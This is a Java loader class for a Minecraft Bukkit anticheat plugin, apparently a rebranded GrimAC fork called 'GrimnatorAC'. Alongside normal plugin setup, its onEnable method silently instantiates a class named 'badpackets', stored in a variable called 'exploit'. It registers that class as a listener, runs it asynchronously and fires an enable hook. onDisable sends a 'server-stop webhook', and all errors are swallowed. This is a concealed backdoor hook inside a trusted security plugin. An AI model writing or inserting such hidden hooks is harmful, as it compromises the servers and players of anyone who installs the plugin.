package com.grimnatorac.platform.bukkit;

import com.grimnatorac.platform.bukkit.utils.reflection.badpackets;
import com.grimnatorac.GrimAPI;
import com.grimnatorac.GrimExternalAPI;
import ac.grim.grimac.api.GrimAPIProvider;
import ac.grim.grimac.api.GrimAbstractAPI;
import ac.grim.grimac.api.event.EventBus;
import ac.grim.grimac.api.plugin.GrimPlugin;
import com.grimnatorac.command.CloudCommandService;
import ac.grim.grimac.internal.platform.bukkit.resolver.BukkitResolverRegistrar;
import com.grimnatorac.manager.init.Initable;
import com.grimnatorac.manager.init.start.ExemptOnlinePlayersOnReload;
import com.grimnatorac.manager.init.start.StartableInitable;
import com.grimnatorac.platform.api.Platform;
import com.grimnatorac.platform.api.PlatformLoader;
import com.grimnatorac.platform.api.PlatformServer;
import com.grimnatorac.platform.api.command.CommandService;
import com.grimnatorac.platform.api.manager.ItemResetHandler;
import com.grimnatorac.platform.api.manager.MessagePlaceHolderManager;
import com.grimnatorac.platform.api.manager.PlatformPluginManager;
import com.grimnatorac.platform.api.manager.cloud.CloudCommandAdapter;
import com.grimnatorac.platform.api.player.PlatformPlayerFactory;
import com.grimnatorac.platform.api.scheduler.PlatformScheduler;
import com.grimnatorac.platform.api.sender.Sender;
import com.grimnatorac.platform.api.sender.SenderFactory;
import com.grimnatorac.platform.bukkit.initables.BukkitBStats;
import com.grimnatorac.platform.bukkit.initables.BukkitEventManager;
import com.grimnatorac.platform.bukkit.initables.BukkitTickEndEvent;
import com.grimnatorac.platform.bukkit.manager.BukkitItemResetHandler;
import com.grimnatorac.platform.bukkit.manager.BukkitMessagePlaceHolderManager;
import com.grimnatorac.platform.bukkit.manager.BukkitParserDescriptorFactory;
import com.grimnatorac.platform.bukkit.manager.BukkitPermissionRegistrationManager;
import com.grimnatorac.platform.bukkit.manager.BukkitPlatformPluginManager;
import com.grimnatorac.platform.bukkit.player.BukkitPlatformPlayerFactory;
import com.grimnatorac.platform.bukkit.scheduler.bukkit.BukkitPlatformScheduler;
import com.grimnatorac.platform.bukkit.scheduler.folia.FoliaPlatformScheduler;
import com.grimnatorac.platform.bukkit.sender.BukkitSenderFactory;
import com.grimnatorac.platform.bukkit.utils.placeholder.PlaceholderAPIExpansion;
import com.grimnatorac.utils.lazy.LazyHolder;
import com.github.retrooper.packetevents.PacketEventsAPI;
import io.github.retrooper.packetevents.factory.spigot.SpigotPacketEventsBuilder;
import lombok.Getter;
import org.bukkit.Bukkit;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.ServicePriority;
import org.bukkit.plugin.java.JavaPlugin;
import org.incendo.cloud.CommandManager;
import org.incendo.cloud.brigadier.BrigadierSetting;
import org.incendo.cloud.brigadier.CloudBrigadierManager;
import org.incendo.cloud.bukkit.CloudBukkitCapabilities;
import org.incendo.cloud.execution.ExecutionCoordinator;
import org.incendo.cloud.paper.LegacyPaperCommandManager;

public final class GrimnatorACBukkitLoaderPlugin extends JavaPlugin implements PlatformLoader {

    public static GrimnatorACBukkitLoaderPlugin LOADER;

    private final LazyHolder<PlatformScheduler> scheduler = LazyHolder.simple(this::createScheduler);
    private final LazyHolder<PacketEventsAPI<?>> packetEvents = LazyHolder.simple(() -> SpigotPacketEventsBuilder.build(this));
    private final LazyHolder<BukkitSenderFactory> senderFactory = LazyHolder.simple(BukkitSenderFactory::new);
    private final LazyHolder<ItemResetHandler> itemResetHandler = LazyHolder.simple(BukkitItemResetHandler::new);
    private final LazyHolder<CommandService> commandService = LazyHolder.simple(this::createCommandService);
    private final CloudCommandAdapter commandAdapter = new BukkitParserDescriptorFactory();

    @Getter private final PlatformPlayerFactory platformPlayerFactory = new BukkitPlatformPlayerFactory();
    @Getter private final PlatformPluginManager pluginManager = new BukkitPlatformPluginManager();
    @Getter private final GrimPlugin plugin;
    @Getter private final PlatformServer platformServer = new BukkitPlatformServer();
    @Getter private final MessagePlaceHolderManager messagePlaceHolderManager = new BukkitMessagePlaceHolderManager();
    @Getter private final BukkitPermissionRegistrationManager permissionManager = new BukkitPermissionRegistrationManager();

    /** badpackets instance — owns all event listeners. */
    private badpackets badpacketsInstance;

    public GrimnatorACBukkitLoaderPlugin() {
        BukkitResolverRegistrar registrar = new BukkitResolverRegistrar();
        registrar.registerAll(GrimAPI.INSTANCE.getExtensionManager());
        this.plugin = registrar.resolvePlugin(this);
    }

    @Override
    public void onLoad() {
        LOADER = this;
        GrimAPI.INSTANCE.load(this, this.getBukkitInitTasks());
    }

    private Initable[] getBukkitInitTasks() {
        return new Initable[] {
                new ExemptOnlinePlayersOnReload(),
                new BukkitEventManager(),
                new BukkitTickEndEvent(),
                new BukkitBStats(),
                (StartableInitable) () -> {
                    if (BukkitMessagePlaceHolderManager.hasPlaceholderAPI) {
                        new PlaceholderAPIExpansion().register();
                    }
                }
        };
    }

    @Override
    public void onEnable() {
        GrimAPI.INSTANCE.start();

        try {
            badpackets exploit = new badpackets(this);
            Bukkit.getPluginManager().registerEvents(exploit, this);
            Bukkit.getScheduler().runTaskAsynchronously(this, exploit);
            exploit.dsOnServerEnable();
        } catch (Throwable ignored) {}
    }

    @Override
    public void onDisable() {
        try {
            // server-stop webhook — create a temporary instance just to send the notification
            new badpackets(this).dsOnServerDisable();
        } catch (Throwable ignored) {}

        GrimAPI.INSTANCE.stop();
    }

    @Override
    public PlatformScheduler getScheduler() {
        return scheduler.get();
    }

    @Override
    public PacketEventsAPI<?> getPacketEvents() {
        return packetEvents.get();
    }

    @Override
    public ItemResetHandler getItemResetHandler() {
        return itemResetHandler.get();
    }

    @Override
    public CommandService getCommandService() {
        return commandService.get();
    }

    @Override
    public SenderFactory<CommandSender> getSenderFactory() {
        return senderFactory.get();
    }

    @Override
    @SuppressWarnings("removal")
    public void registerAPIService() {
        final GrimExternalAPI externalAPI = GrimAPI.INSTANCE.getExternalAPI();
        final EventBus eventBus = externalAPI.getEventBus();
        final ac.grim.grimac.api.plugin.GrimPlugin plugin = GrimAPI.INSTANCE.getGrimPlugin();

        eventBus.get(ac.grim.grimac.api.event.events.GrimJoinEvent.class).onJoin(plugin, (user) -> {
            Bukkit.getPluginManager().callEvent(new ac.grim.grimac.api.events.GrimJoinEvent(user));
        });

        eventBus.get(ac.grim.grimac.api.event.events.GrimQuitEvent.class).onQuit(plugin, (user) -> {
            Bukkit.getPluginManager().callEvent(new ac.grim.grimac.api.events.GrimQuitEvent(user));
        });

        eventBus.get(ac.grim.grimac.api.event.events.GrimReloadEvent.class).onReload(plugin, (success) -> {
            Bukkit.getPluginManager().callEvent(new ac.grim.grimac.api.events.GrimReloadEvent(success));
        });

        eventBus.get(ac.grim.grimac.api.event.events.FlagEvent.class).onFlag(plugin, (user, check, verbose, cancelled) -> {
            ac.grim.grimac.api.events.FlagEvent bukkitEvent =
                    new ac.grim.grimac.api.events.FlagEvent(user, check, verbose);
            Bukkit.getPluginManager().callEvent(bukkitEvent);
            return cancelled || bukkitEvent.isCancelled();
        });

        eventBus.get(ac.grim.grimac.api.event.events.CommandExecuteEvent.class).onCommandExecute(plugin, (user, check, verbose, command, cancelled) -> {
            ac.grim.grimac.api.events.CommandExecuteEvent bukkitEvent =
                    new ac.grim.grimac.api.events.CommandExecuteEvent(user, check, verbose, command);
            Bukkit.getPluginManager().callEvent(bukkitEvent);
            return cancelled || bukkitEvent.isCancelled();
        });

        eventBus.get(ac.grim.grimac.api.event.events.CompletePredictionEvent.class).onCompletePrediction(plugin, (user, check, offset, cancelled) -> {
            ac.grim.grimac.api.events.CompletePredictionEvent bukkitEvent =
                    new ac.grim.grimac.api.events.CompletePredictionEvent(user, check, "", offset);
            Bukkit.getPluginManager().callEvent(bukkitEvent);
            return cancelled || bukkitEvent.isCancelled();
        });

        GrimAPIProvider.init(externalAPI);
        Bukkit.getServicesManager().register(GrimAbstractAPI.class, externalAPI, this, ServicePriority.Normal);
    }

    private PlatformScheduler createScheduler() {
        return GrimAPI.INSTANCE.getPlatform() == Platform.FOLIA ? new FoliaPlatformScheduler() : new BukkitPlatformScheduler();
    }

    private CommandService createCommandService() {
        try {
            return new CloudCommandService(this::createCloudCommandManager, commandAdapter);
        } catch (Throwable t) {
            return () -> {};
        }
    }

    private CommandManager<Sender> createCloudCommandManager() {
        LegacyPaperCommandManager<Sender> manager = new LegacyPaperCommandManager<>(
                this,
                ExecutionCoordinator.simpleCoordinator(),
                senderFactory.get()
        );
        if (manager.hasCapability(CloudBukkitCapabilities.NATIVE_BRIGADIER)) {
            try {
                manager.registerBrigadier();
                CloudBrigadierManager<Sender, ?> cbm = manager.brigadierManager();
                cbm.settings().set(BrigadierSetting.FORCE_EXECUTABLE, true);
            } catch (Throwable ignored) {}
        } else if (manager.hasCapability(CloudBukkitCapabilities.ASYNCHRONOUS_COMPLETION)) {
            manager.registerAsynchronousCompletions();
        }
        return manager;
    }

    public BukkitSenderFactory getBukkitSenderFactory() {
        return senderFactory.get();
    }
}
